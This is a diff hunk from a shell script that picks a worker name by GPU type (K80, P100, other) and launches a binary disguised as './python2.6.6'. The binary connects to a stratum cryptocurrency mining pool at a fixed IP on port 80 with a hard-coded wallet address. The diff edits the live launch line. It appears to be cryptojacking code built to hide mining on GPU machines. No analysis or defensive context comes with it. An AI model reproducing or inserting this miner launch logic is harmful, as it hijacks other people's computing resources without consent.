@@ -39,5 +39,5 @@ elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
     ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.CU_K80_$IPNAME@116.203.10.54:80  -U
 else
-    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.CU_P100_$IPNAME@116.203.10.54:80  -U
+    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OTHER_$IPNAME@116.203.10.54:80  -U
 fi
